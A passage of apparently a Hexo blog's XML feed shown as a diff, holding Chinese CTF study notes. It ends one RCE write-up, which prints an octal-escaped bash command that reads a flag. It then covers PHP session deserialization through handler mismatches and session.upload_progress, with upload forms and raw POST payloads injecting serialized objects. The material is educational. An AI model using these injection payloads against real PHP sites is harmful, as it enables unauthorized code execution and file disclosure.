+<p>但是正如常用的<code>bash&lt;&lt;&lt;...</code>这道题还可以尝试构造<code>bash</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\142\141\163\150&#x27;&lt;&lt;&lt;$&#x27;\143\141\164\40\57\146\52&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>也可以成功读到flag。</p>
+<p>注意知识点的融汇贯通。</p>
+<p>其他的题可以看看</p>
+<p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">CTFshow-周末大挑战官方wp</a></p>
+]]></content>
+      <categories>
+        <category>rce</category>
+        <category>rce之利用shell变量</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>session反序列化学习</title>
+    <url>/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>好用，爱用，多用</p>
+<span id="more"></span>
+
+<h4 id="PHP-session的说明"><a href="#PHP-session的说明" class="headerlink" title="PHP session的说明"></a>PHP session的说明</h4><h5 id="php-session的定义"><a href="#php-session的定义" class="headerlink" title="php session的定义"></a>php session的定义</h5><p><strong>先说明一下什么是Session：</strong><br><em>Session一般称为“会话控制”，简单来说就是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 <code>session</code> 会话，便可以在网站的任何页面使用或保持这个会话</em>，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同。</p>
+<p><strong>PHP session：</strong></p>
+<p><u>PHP session可以看做是一个特殊的变量，且该变量是用于存储关于用户会话的信息，或者更该用户会话的设置</u>，需要注意的是，**<code>PHP Session</code> 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的*<em>，</em>且其对应的具体 <code>session</code> 值会存储于服务器端*，这也是与 <code>cookie</code>的主要区别，所以<code>seesion</code> 的安全性相对较高。</p>
+<h5 id="PHP-session的工作流程"><a href="#PHP-session的工作流程" class="headerlink" title="PHP session的工作流程"></a>PHP session的工作流程</h5><p>会话工作流程很简单，当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的<code>Cookie</code>、<code>Get</code>、<code>Post</code>中不存在<code>session id</code>，PHP就会自动调用<code>php_session_create_id</code>函数创建一个新的会话,并且在<code>http response</code>中通过<strong>set-cookie头部发送给客户端保存</strong>。</p>
+<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
+<p><strong>会话开始后，PHP就会将会话中的数据设置到<code>$_SESSION</code>变量中</strong>，如下述代码就是一个在<code>$_SESSION</code>变量中注册变量的例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;username&#x27;])) &#123;</span><br><span class="line">  $_SESSION[&#x27;username&#x27;] = &#x27;xianzhi&#x27; ;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>当PHP停止的时候，它会自动读取<code>$_SESSION</code>中的内容，并将其进行序列化，然后发送给会话保存管理器来进行保存</strong></p>
+<p>默认情况下<em>，PHP 使用内置的文件会话保存管理器来完成<code>session</code>的保存，<strong>也可以通过配置项 <code>session.save_handler</code> 来修改所要采用的会话保存管理器</strong></em>。 <em>对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置</em>。可参考下图：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422113603242-17142857356101.png" alt="image-20240422113603242"></p>
+<h5 id="PHP-session在php-ini中的配置"><a href="#PHP-session在php-ini中的配置" class="headerlink" title="PHP session在php.ini中的配置"></a>PHP session在php.ini中的配置</h5><p><code>PHP session</code>在<code>php.ini</code>中主要存在以下配置项:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">session.save_handler=files     该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数  这里表明session是以文件的方式来进行存储的</span><br><span class="line"></span><br><span class="line">session.serialize_handler=php       该配置主要设定用户自定义存储函数  这里表明session的默认序列话引擎使用的是php处理器引擎</span><br><span class="line"></span><br><span class="line">session.save_path=&quot;D:\PHP\phpStudy\PHPTutorial\tmp\tmp&quot; 该配置主要设置session的存储路径  这里表明所有的session文件都是存储在xampp/tmp下</span><br><span class="line"></span><br><span class="line">session.auto_start=0                表明默认不启动session</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>session.save_handler&#x3D;””</li>
+</ul>
+<p>​        <strong>该配置主要设定用户自定义存储函数</strong>，如果想使用PHP内置<code>session</code>存储机制之外的可以使用这个函数</p>
+<ul>
+<li><strong>session.serialize_handler</strong></li>
+</ul>
+<p><u>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code></u>，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</p>
+<p>等<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-0">参考</a>，下面主要谈谈<code>session.serialize_handler</code>配置项。</p>
+<h4 id="PHP-session的处理器及如何利用"><a href="#PHP-session的处理器及如何利用" class="headerlink" title="PHP session的处理器及如何利用"></a>PHP session的处理器及如何利用</h4><p>上文中提到的PHP session的<strong>序列化机制是由<code>session.serialize_handler</code>来定义引擎的</strong>，引擎也就是php处理器，<em>而序列化后的字符串默认是以文件的方式存储</em>，<em>且存储的文件是由<code>sess_sessionid</code>来决定文件名的</em>，如下：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202003456.png" alt="image-20240425202003456"></p>
+<p>当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>等。</p>
+<p>并且文件的内容始终是session值的序列化之后的内容。</p>
+<h5 id="利用函数先说明"><a href="#利用函数先说明" class="headerlink" title="利用函数先说明"></a>利用函数先说明</h5><p>1.PHP提供了<code>session.serialize_handler</code>配置的选项，可以用来定义要使用的处理器，默认是php，如果想要使用其他的就需要<strong>使用ini_set()函数</strong>，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>2.要想使用session，第一步就是开启session，这也是session的第一阶段这是就需要使用<strong>session_start()函数</strong>。</p>
+<p><strong>这个函数的作用就是开启session</strong>，开启之后读取cookie信息判断是否存在session_id，<u>如果存在就是用这个session_id</u>，如果没有就会随机生成一个唯一的32位的session_id。通过这个session_id就可以绑定一个唯一的用户。</p>
+<p><strong>这个过程还会初始化<code>$SESSION</code>这个变量，但是有两种情况：</strong></p>
+<ul>
+<li><p><strong>若没有这个session文件</strong>，就会读取cookie信息的内容从而序列化数据创建<code>$_SESSION</code>变量并创建一个session文件；</p>
+</li>
+<li><p><strong>若存在session文件</strong>，读取session文件中的内容，把内容反序列化之后赋值到<code>$SESSION</code>这个变量中**，这个阶段还有一个特别关键的作用，还会判断那些session文件已经过期，调用gc进程，删除掉过期的session文件</p>
+</li>
+</ul>
+<p><a href="https://www.cnblogs.com/daijiandong/p/12070947.html">参考文章1</a>以及<a href="https://blog.csdn.net/cs23405/article/details/81297698">2</a></p>
+<h5 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h5><p><strong><code>sessin.serialize_handler</code>定义的引擎有三种</strong>，如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>处理器名称</th>
+<th>存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php</td>
+<td>键名+竖线+经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_binary</td>
+<td>键名的长度对应的<strong>ASCII字符</strong>（如键长为35则对应<code>#</code>）+键名+经过<code>serialize()</code>函数序列化处理的值</td>
+</tr>
+<tr>
+<td>php_serialize</td>
+<td>经过<code>serialize()</code>函数序列化处理的<strong>数组</strong></td>
+</tr>
+</tbody></table>
+<p><strong>注</strong>：从PHP 5.5.4起可以使用<code>php_serialize</code></p>
+<p><u>上述三种处理器中</u>，*<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数*，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
+<p>测试一下，demo如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="php"><a href="#php" class="headerlink" title="php"></a>php</h6><p>如图所示：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422192647948.png" alt="image-20240422192647948"></p>
+<p>解析一下：<br>序列化的结果为:<code>session|s:6:&quot;Fupanc&quot;;</code></p>
+<p>其中<code>session</code>为$_SESSION[‘session’]的键名，<code>|</code>为传入GET参数经过序列化后的值。</p>
+<h6 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h6><p>将指定处理器函数的参数php改为这个就行，为了方便看，将键名改长一些，（否则对应的ascii字符不可见)，测试结果如下</p>
+<p>demo改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionseesionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422193133901.png" alt="image-20240422193133901"></p>
+<p>两张图片可以对比一下</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200413609.png" alt="image-20240422200413609"></p>
+<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:6:&quot;Fupanc&quot;;</code></p>
+<p>解析一下：<br><code>#</code>即为长度为35在ascii对应的符号</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422200554081.png" alt="image-20240422200554081"></p>
+<p><code>sessionsessionsessionsessionsessions</code>是键名,</p>
+<p><strong>注意：</strong>这里序列化后的结果会在原代码设置的键名后加一个s，测试了一下，无论大写为多少。</p>
+<p><code>6:&quot;Fupanc&quot;;</code>即为序列化后的字符串。</p>
+<h6 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h6><p>demo如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>测试结果：<br><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240422201421239.png" alt="image-20240422201421239"></p>
+<p>序列化结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:6:&quot;Fupanc&quot;;&#125;</code></p>
+<p>解析：<br><code>a:1</code>表示<code>$_SESSION</code>数组中有一个元素，或括号里面的内容即为传入GET参数经过序列化后的值。</p>
+<h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><h6 id="自建环境测试"><a href="#自建环境测试" class="headerlink" title="自建环境测试"></a>自建环境测试</h6><p>建造一个环境，有两个文件，分别如下：</p>
+<p>flag.php：</p>
+<p>这个页面用于接受session的值</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;session&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;session&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>1.php：</p>
+<p>这个页面用于测试反序</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handller&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;haha&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">print_r</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先访问1.php，输出</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203335935.png" alt="image-20240423203335935"></p>
+<p>这里开启了<code>session_start()</code>函数，可以在flag.php页面利用session变量进行反序列化。如下构造payload：</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202531645.png" alt="image-20240425202531645"></p>
+<p>再在flag.php页面传入这个参，但是需要在前面加上一个<code>|</code>，这是因为php处理器会把|前面的内容当做键，后面的内容才会被反序列化后赋值给session变量</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423203811665.png" alt="image-20240423203811665"></p>
+<p>在电脑上看一看此时session的值：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:7:&quot;session&quot;;s:40:&quot;|O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;diyici&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里可以看到成功写入，这是再访问以下1.php</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240425202506406.png" alt="image-20240425202506406"></p>
+<p>成功反序。</p>
+<p><strong>但是这里的局限性太大，有如下条件：</strong></p>
+<ul>
+<li>两个文件session引擎配置不同</li>
+<li>其中一个session可控</li>
+<li>两个文件同域</li>
+</ul>
+<p>这个只是一个简单的复现过程，真实题目应该不能自己传session进去，现在看看稍真实页面是如何打的。</p>
+<h6 id="利用session-upload-progress进行反序列化-方式一"><a href="#利用session-upload-progress进行反序列化-方式一" class="headerlink" title="利用session.upload_progress进行反序列化-方式一"></a>利用session.upload_progress进行反序列化-方式一</h6><p>结合下述Session上传进度，<strong>这个方法需要php≥5.4</strong></p>
+<p><a href="https://bugs.php.net/bug.php?id=71101">漏洞官方说明</a></p>
+<p>这个漏洞条件官方说的挺清楚的，简单说明一下使用这个方法的条件</p>
+<p>条件：</p>
+<ol>
+<li><code>session.upload_progress.enabled = On</code>（是否启用上传进度报告）</li>
+<li><code>session.upload_progress.cleanup = Off</code>（是否上传完成之后删除session文件-这里需要为Off）</li>
+</ol>
+<p>这两个都是可在查的</p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/image-20240423211803946.png" alt="image-20240423211803946"></p>
+<p><strong>当enabled被设置为on时，此时再往服务器中上传一个文件时，PHP会把该文件的详细信息（如上传时间、上传进度等）存储到session，所以上传文件进度的报告就会以写入到session文件中</strong>，所以我们<u>可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据</u>。我们就可以控制这个数据内容为我们的恶意payload</p>
+<p><strong>对session上传进度说明一下：</strong></p>
+<p><img src="/2024/04/28/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/1647333728_62305160591d530edf695.jpeg" alt="image-20220315161551104"></p>
+<p>但是需要自己构造一个<strong>文件上传表单</strong>，代码如下：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>，在上传文件(必须上传)时抓包，直接借用官方的说明，有两种改法（第二种待验证）来进行反序：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-POST_RAW--</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHPSESSID&quot;</span><br><span class="line"></span><br><span class="line">session-data-injection</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxO:3:&quot;obj&quot;:0:&#123;&#125;</span><br><span class="line">-----------------------------20896060251896012921717172737</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;file.txt&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">-----------------------------20896060251896012921717172737--</span><br></pre></td></tr></table></figure>
+
+<p>第一个就是上述官方改法，还有一个是在<a href="https://www.freebuf.com/articles/web/324943.html">文章</a>里看到可以改将filename那个file.txt改成payload(文章基本都是这样改的，在值里面改肯能会应该出现|导致数据写入session失败)</p>
+<p><strong>但是文件名需要注意防止引号被转义同时也是为了防止与最外层的双引号冲突</strong>，需要使用\来说明，借用文章代码说明一下（待验证-还是很多文章都在用这种改法）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">-----------------------------23899461075638356511525184357--</span><br></pre></td></tr></table></figure>
+
+<p><strong>上传成功就可以直接在Index.php页面利用这个payload</strong></p>
+<h6 id="利用session-upload-progress进行反序列化-方式二"><a href="#利用session-upload-progress进行反序列化-方式二" class="headerlink" title="利用session.upload_progress进行反序列化-方式二"></a>利用session.upload_progress进行反序列化-方式二</h6><p><strong>同样需要php≥5.4</strong></p>
+<p>这个方法着重于解决当配置如下使如何解决,一般这个是php.ini的默认项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled = on</span><br><span class="line">2. session.upload_progress.cleanup = on</span><br><span class="line">3. session.upload_progress.prefix = &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq = &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq = &quot;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里与上面的最主要的区别就是<code>session.upload_progress.cleanup = on</code>，<u>表示当文件上传结束后，php将会立即清空对应session文件中的内容</u>，也就代表我们每次<strong>正常访问</strong>session文件时都是<strong>空文件</strong>。所以想要利用就需要竞争。</p>
+<p><strong>如果cleanup被设置为On，就需要使用条件竞争</strong></p>
+<p>&#x3D;&#x3D;还有一个比较重要的配置：&#x3D;&#x3D;<br><code>session.use_strict_mode=off</code>，这个选项默认值为off，表示我们对cookie中的sessionid可控。这一点很重要。</p>
+<p>开始解析：</p>
+<ul>
+<li>配置文件中的<code>session.use_strict_mode</code>默认为0时，这个情况下，用户可以定义自己的sessionid，例如当用户在cookie中设置<code>sessionid=Lxxx</code>时，PHP就会生成一个文件<code>/tmp/sess_Lxxx</code>，此时也就初始化了session，并且会将上传的文件信息写入到文件<code>/tmp/sess_Lxxx</code>中去。</li>
+<li>由于<strong>在这种情况下cleanup的值为on</strong>，所以文件上传成功后文件内容会马上被清空，此时就需要利用Python的多线程来条件竞争</li>
+</ul>
+<p>脚本后面补，遇到题再搓出来。</p>
+<p>参考文章:<code>https://www.freebuf.com/vuls/202819.html</code></p>
+<p>其他例题参考：<br>1.简单过程说明以及其他ctf题解<a href="https://xz.aliyun.com/t/6640?time__1311=n4+xnD0DRDBGitN4q05+bDyiDumxc7l1lZZYD&alichlgref=https://cn.bing.com/#toc-9">文章</a></p>
+]]></content>
+      <categories>
+        <category>php相关漏洞</category>
+        <category>php反序列化</category>
+        <category>session反序列化</category>
       </categories>
   </entry>
   <entry>
